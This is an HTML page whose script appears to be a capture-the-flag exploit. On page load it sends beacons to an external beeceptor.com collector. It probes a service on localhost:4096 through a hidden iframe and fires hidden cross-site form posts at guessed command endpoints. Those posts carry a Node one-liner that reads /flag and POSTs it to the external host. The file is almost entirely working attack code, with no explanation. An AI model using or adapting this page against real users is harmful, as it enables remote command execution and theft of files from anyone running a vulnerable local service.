<!DOCTYPE html>
<html>
<body>
<script>
(function() {
    const EXFIL = "http://1233334.free.beeceptor.com";
    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
    function beacon(action, extra) {
        new Image().src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
    }
    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
    const BASE = 'http://localhost:4096';
    function postForm(url, data) {
        let iframe = document.createElement('iframe');
        iframe.name = 'hiddenFormTarget';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        let form = document.createElement('form');
        form.method = 'POST';
        form.action = url;
        form.target = 'hiddenFormTarget';
        form.style.display = 'none';
        for (let [k, v] of Object.entries(data)) {
            let input = document.createElement('input');
            input.type = 'hidden';
            input.name = k;
            input.value = v;
            form.appendChild(input);
        }
        document.body.appendChild(form);
        form.submit();
        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
    }
    beacon('start');
    let probe = document.createElement('iframe');
    probe.style.display = 'none';
    probe.src = BASE + '/';
    probe.onload = () => {
        beacon('port_open');
        const endpoints = ['/exec', '/cmd', '/api/exec', '/api/cmd', '/run', '/shell', '/api/shell', '/command'];
        const paramNames = ['cmd', 'command', 'input', 'text'];
        endpoints.forEach(ep => {
            paramNames.forEach(pn => {
                let data = {};
                data[pn] = PAYLOAD;
                postForm(BASE + ep, data);
            });
        });
        // 也尝试 session 方式
        postForm(BASE + '/session', {});
        setTimeout(() => {
            const ids = ['1', '2', '3', 'session', 'default'];
            ids.forEach(id => {
                paramNames.forEach(pn => {
                    let data = {};
                    data[pn] = PAYLOAD;
                    postForm(BASE + `/session/${id}/shell`, data);
                });
            });
        }, 1000);
        beacon('exploit_sent');
    };
    probe.onerror = () => beacon('port_error');
    document.body.appendChild(probe);
})();
</script>
</body>
</html>
